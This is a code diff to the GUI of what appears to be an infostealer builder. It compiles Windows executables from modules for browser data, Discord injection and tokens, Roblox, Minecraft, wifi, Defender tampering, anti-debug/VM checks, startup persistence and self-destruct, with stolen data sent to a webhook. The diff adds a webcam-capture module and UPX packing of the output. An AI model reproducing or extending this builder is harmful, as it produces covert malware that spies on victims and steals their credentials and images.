@@ -3,7 +3,6 @@ import customtkinter
 import logging
 import os
 import random
-import re
 import requests
 import shutil
 import string
@@ -13,6 +12,7 @@ import threading
 import time
 from PIL import Image
 from tkinter import filedialog
+from tools import upx
 
 logging.basicConfig(
 	level=logging.DEBUG,
@@ -54,7 +54,8 @@ class App(customtkinter.CTk):
 			"discord": False,
 			"anti_spam": False,
 			"self_destruct": False,
-			"clipboard": False
+			"clipboard": False,
+			"webcam": False
 		}
 
 		image_path = os.path.join(os.path.dirname(os.path.realpath(__file__)), "./gui_images/")
@@ -207,7 +208,11 @@ class App(customtkinter.CTk):
 
 		self.clipboard = customtkinter.CTkCheckBox(self.builder_frame, text="Clipboard", font=customtkinter.CTkFont(size=17, family=self.font),
 												fg_color="#5d11c3", hover_color="#5057eb")
-		self.clipboard.grid(row=1, column=0, sticky="nw", padx=286, pady=328)
+		self.clipboard.grid(row=1, column=0, sticky="nw", padx=85, pady=328)
+		
+		self.webcam = customtkinter.CTkCheckBox(self.builder_frame, text="Webcam", font=customtkinter.CTkFont(size=17, family=self.font),
+												fg_color="#5d11c3", hover_color="#5057eb")
+		self.webcam.grid(row=1, column=0, sticky="nw", padx=286, pady=328)
 
 		self.fileopts = customtkinter.CTkOptionMenu(self.builder_frame, values=["nuitka (.exe)", "pyinstaller (.exe)", ".py"],
 													font=customtkinter.CTkFont(size=32, family=self.font), width=250, height=45,
@@ -228,7 +233,7 @@ class App(customtkinter.CTk):
 											 fg_color="#5d11c3", hover_color="#5057eb", command=self.buildfile)
 		self.build.grid(row=1, column=0, sticky="ne", padx=85, pady=420)
 
-		self.checkboxes = [self.ping, self.pingtype, self.error, self.startup, self.defender, self.systeminfo, self.backupcodes, self.browser,
+		self.checkboxes = [self.ping, self.pingtype, self.error, self.startup, self.defender, self.systeminfo, self.backupcodes, self.browser, self.webcam,
 						   self.roblox, self.obfuscation, self.injection, self.minecraft, self.wifi, self.killprotector, self.antidebug_vm, self.discord, self.clipboard]
 
 		# Frame 2
@@ -329,12 +334,6 @@ Nuitka - Builds a standalone executable file with the necessary modules inside o
 		else:
 			self.pump_size.configure(state="disabled")
 
-	# def multi_commands(self, value):
-	# 	if value in ["nuitka (.exe)", "pyinstaller (.exe)"]:
-	# 		self.check_icon()
-	# 	elif value == ".py":
-	# 		self.check_icon()
-
 	def get_mb(self):
 		self.mb = self.pump_size.get()
 		byte_size = int(self.mb.replace("mb", ""))
@@ -392,7 +391,8 @@ Nuitka - Builds a standalone executable file with the necessary modules inside o
 			"discord": self.discord,
 			"anti_spam": self.antispam,
 			"self_destruct": self.self_destruct,
-			"clipboard": self.clipboard
+			"clipboard": self.clipboard,
+			"webcam": self.webcam
 		}
 
 		for key, checkbox in checkbox_mapping.items():
@@ -539,6 +539,11 @@ Nuitka - Builds a standalone executable file with the necessary modules inside o
 				with open(options+"Wifi.py", "r", encoding="utf-8") as f:
 					code += f.read()
 					code += "\n\n"	
+					
+			if self.updated_dictionary["webcam"] == True:
+				with open(options+"webcam.py", "r", encoding="utf-8") as f:
+					code += f.read()
+					code += "\n\n"
 
 			code += """
 if __name__ == '__main__' and os.name == "nt":
@@ -618,10 +623,13 @@ if __name__ == '__main__' and os.name == "nt":
 				"systeminfo": ["psutil", "subprocess"],
 				"self_destruct": ["subprocess", "sys"],
 				"startup": ["sys"],
-				"wifi": ["subprocess"]
+				"wifi": ["subprocess"],
+				"webcam": ["cv2"]
 			}
 
 			if filetype == "pyinstaller":
+				upx.UPX()
+
 				included_modules = included_modules_pyinstaller
 				option_module_mapping = option_module_mapping_pyinstaller
 			
@@ -666,9 +674,8 @@ if __name__ == '__main__' and os.name == "nt":
 							
 						if exeicon != "NONE":
 							command.insert(-1, f"--windows-icon-from-ico={exeicon}")
-							subprocess.run(command)
-						else:	
-							subprocess.run(command)
+							
+						subprocess.run(command)
 						logging.info(f"Successfully compiled {filename}.exe with nuitka")
 					except Exception as e:
 						logging.error(f"Error with compiling file: {e}")
@@ -715,6 +722,11 @@ if __name__ == '__main__' and os.name == "nt":
 			logging.error(_message)
 
 	def buildfile(self):
+		if self.return_filename() == "nuitka":
+			_message = f"Invalid filename."
+			logging.error(_message)
+			print(_message)
+			return
 		if not self.verify_webhook():
 			_message = "Webhook not valid. Aborting compilation."
 			logging.error(_message)
